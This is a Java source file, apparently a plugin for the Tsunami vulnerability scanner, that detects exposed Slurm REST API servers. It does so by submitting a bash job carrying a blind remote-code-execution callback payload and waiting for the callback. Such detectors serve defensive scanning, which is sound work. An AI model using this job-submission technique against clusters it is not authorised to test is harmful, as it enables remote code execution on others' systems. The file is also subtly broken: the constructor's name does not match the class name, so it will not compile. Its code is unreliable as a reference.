/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the exposed slurm rest server. */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SlurmExposedRestApiVulnDetector",
    version = "0.1",
    description = "This detector checks for an exposed Slurm REST API",
    author = "lancedD00m",
    bootstrapModule = SlurmExposedRestApiDetectorBootstrapModule.class)
public class SlurmExposedRestApiDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final PayloadGenerator payloadGenerator;

  @VisibleForTesting
  static final String JOB_PAYLOAD =
      "{"
          + "    \"job\": {"
          + "        \"name\": \"test\","
          + "        \"ntasks\": 1,"
          + "        \"current_working_directory\": \"/tmp\","
          + "        \"environment\": ["
          + "            \"PATH:/bin:/usr/bin/:/usr/local/bin/\","
          + "            \"LD_LIBRARY_PATH:/lib/:/lib64/:/usr/local/lib\""
          + "       ]"
          + "    },"
          + "    \"script\": \"#!/bin/bash\\n %s\""
          + "}";

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  SlurmExposedRestApiDaemonDetector(
      HttpClient httpClient, @UtcClock Clock utcClock, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("SlurmRestApiDaemonRceVulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @VisibleForTesting
  String buildRootUri(NetworkService networkService) {
    return buildWebApplicationRootUrl(networkService);
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var payload = getTsunamiCallbackHttpPayload();
    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    String cmd = payload.getPayload();

    final String rootUri = buildRootUri(networkService);

    try {
      // Submitting a slurm job
      HttpResponse openapiV3Response =
          httpClient.send(get(rootUri + "openapi/v3").withEmptyHeaders().build(), networkService);
      if (openapiV3Response.bodyString().isEmpty()) {
        return false;
      }
      Matcher m =
          Pattern.compile("\"\\\\/slurm\\\\/(v0.0.\\d\\d)\\\\/job\\\\/submit\"")
              .matcher(openapiV3Response.bodyString().get());
      if (!m.find()) {
        return false;
      }
      String apiVersion = m.group(1);
      // Submitting a slurm job
      httpClient.send(
          post(String.format(rootUri + "slurm/%s/job/submit", apiVersion))
              .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
              .setRequestBody(ByteString.copyFromUtf8(String.format(JOB_PAYLOAD, cmd)))
              .build(),
          networkService);
    } catch (RuntimeException | IOException e) {
      logger.atWarning().withCause(e).log(
          "Fail to exploit '%s'. Maybe it is not vulnerable", rootUri);
      return false;
    }

    // If there is an RCE, the execution isn't immediate
    logger.atInfo().log("Waiting for RCE callback.");
    try {
      Thread.sleep(10000);
    } catch (InterruptedException e) {
      logger.atWarning().withCause(e).log("Failed to wait for RCE result");
      return false;
    }
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("RCE payload executed!");
      return true;
    }
    return false;
  }

  private Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("SlurmExposedRestApi"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Exposed Slurm REST API Server")
                .setDescription(
                    "This detector checks for exposed slurm rest api servers by submitting a job "
                        + "and checking a callback response on tsunami callback server")
                .setRecommendation(
                    "Set proper authentication for the Slurm Rest API server and "
                        + "ensure the API is not publicly exposed through a "
                         + "misconfigured reverse proxy."))
        .build();
  }
}
